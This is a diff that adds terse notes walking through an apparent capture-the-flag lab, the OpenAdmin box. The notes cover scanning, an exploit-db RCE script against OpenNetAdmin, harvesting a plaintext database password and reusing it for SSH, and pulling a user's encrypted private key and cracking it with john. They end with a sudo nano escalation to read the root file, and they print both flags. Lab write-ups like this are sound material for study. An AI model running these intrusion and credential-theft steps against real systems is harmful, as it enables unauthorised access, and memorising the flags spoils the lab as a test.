@@ -1,0 +1,96 @@
+nmap -sC -sV 10.10.10.171 -v -A
+
+port 80 -> website
+dirb shows /music -> login
+
+opennetadmin v18.1.1
+searchsploit opennetadmin -> rce
+
+cp from exploitdb in exploit.sh
+./exploit.sh http://10.10.10.171/ona/
+
+cant move from /opt/ona/www
+ls -all /home
+-> jimmy
+-> joanna
+
+cat login.php -> /config/config.inc.php
+-> nothing
+
+search in directories
+cat local/config/database_settings.inc.php:
+<?php
+
+$ona_contexts=array (
+  'DEFAULT' =>
+  array (
+    'databases' =>
+    array (
+      0 =>
+      array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+    ),
+    'description' => 'Default data context',
+    'context_color' => '#D3DBFF',
+  ),
+);
+
+ssh jimmy@10.10.10.171 with `n1nj4W4rri0R!` -> works
+not user tho
+
+ls -all /var/www:
+total 16
+drwxr-xr-x  4 root     root     4096 Nov 22 18:15 .
+drwxr-xr-x 14 root     root     4096 Nov 21 14:08 ..
+drwxr-xr-x  6 www-data www-data 4096 Nov 22 15:59 html
+drwxrwx---  2 jimmy    internal 4096 Nov 23 17:43 internal
+lrwxrwxrwx  1 www-data www-data   12 Nov 21 16:07 ona -> /opt/ona/www
+
+jimmy can access internal
+main.php:
+
+<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
+# Open Admin Trusted
+# OpenAdmin
+$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+echo "<pre>$output</pre>";
+?>
+<html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+
+gotta curl localhost to have joanna private key
+-> doesnt work on port 80
+
+netstat -tulpn to see open ports waiting for connection
+-> curl http://127.0.0.1:52846/main.php
+
+we have aes-128-cbc encrypted joanna rsa priv key
+first gotta crack rsa with john:
+
+python /usr/share/john/ssh2john.py joanna_rsa > joanna_rsa_hash
+john --wordlist=/usr/share/wordlists/rockyou.txt joanna_rsa_hash
+
+-> bloodninjas is password
+
+ssh joanna@10.10.10.171 -i joanna_rsa with bloodninjas passwd
+
+user flag:
+c9b2cf07d40807e62af62660f0c81b5f
+
+sudo -l
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+
+sudo nano /opt/priv
+then CTRL-R to read /root/root.txt
+
+root flag
+2f907ed450b361b2c2bf4e8795d5b561
